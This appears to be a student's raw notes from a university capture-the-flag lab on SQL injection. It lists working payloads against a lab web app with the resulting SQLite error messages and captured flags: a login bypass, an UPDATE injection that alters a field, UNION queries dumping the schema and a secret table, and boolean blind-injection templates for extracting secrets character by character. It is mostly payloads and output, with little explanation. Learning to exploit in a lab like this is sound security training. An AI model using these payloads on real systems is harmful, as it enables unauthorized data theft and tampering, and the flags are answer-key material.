http://mustard.stt.rnl.tecnico.ulisboa.pt:22261/

' OR 1=1 --

(sqlite3.OperationalError) near "omegalol": syntax error [SQL: SELECT id, username, password, bio, age, jackpot_val FROM user WHERE username = 'admin' AND password = '' omegalol OR 1O1 "'] (Background on this error at: https://sqlalche.me/e/14/e3q8)

SSof{You_are_granted_super_powers_by_a_SQLi_on_SELECT}

http://mustard.stt.rnl.tecnico.ulisboa.pt:22261

You can only execute one statement at a time.

(sqlite3.OperationalError) near "' WHERE username = '": syntax error [SQL: UPDATE user SET bio = 'ola' , jacp=0 ' WHERE username = 'teste1'] (Background on this error at: https://sqlalche.me/e/14/e3q8)


ola' , jackpot_val = '0

SSof{SQLi_can_also_happen_on_UPDATEs}

http://mustard.stt.rnl.tecnico.ulisboa.pt:22261



sqlite_master - a single "schema table" that stores the schema for that database.
tbl_name - name of the table that the object belongs to
sql -

(sqlite3.OperationalError) near "%": syntax error [SQL: SELECT id, title, content FROM blog_post WHERE title LIKE '%' or%' OR content LIKE '%' or%'] (Background on this error at: https://sqlalche.me/e/14/e3q8)

%

' UNION ALL SELECT name, tbl_name, sql FROM 'sqlite_master'; --

secret_blog_post
CREATE TABLE secret_blog_post ( id INTEGER NOT NULL, title TEXT, content TEXT, PRIMARY KEY (id), UNIQUE (title) )

' UNION ALL SELECT id, title, content FROM 'secret_blog_post'; --

SSof{All_tables_are_vulnerable_with_UNION_constructor}


http://mustard.stt.rnl.tecnico.ulisboa.pt:22262

fix the login and update profile problems!
the admin just stopped showing the blog posts

(sqlite3.OperationalError) no such table: a [SQL: SELECT id, title, content FROM blog_post WHERE title LIKE '%' UNION ALL SELECT NULL, NULL, NULL FROM 'a'; --%' OR content LIKE '%' UNION ALL SELECT NULL, NULL, NULL FROM 'a'; --%'] (Background on this error at: https://sqlalche.me/e/14/e3q8)

asdfghjkl' UNION SELECT tbl_name, type, NULL FROM 'sqlite_master' WHERE type='table' AND tbl_name LIKE '{text}%'; --

asdfghjkl' UNION SELECT name, NULL, NULL FROM pragma_table_info('super_s_sof_secrets') WHERE name LIKE '{text}%'; --    

asdfghjkl' UNION SELECT secret, NULL, NULL FROM 'super_s_sof_secrets' WHERE secret LIKE '{text}%'; --   


super_s_sof_secrets

secret

SSof{I_am_only_partially_blind_since_I_can_get_your_data_using_boolean_injection}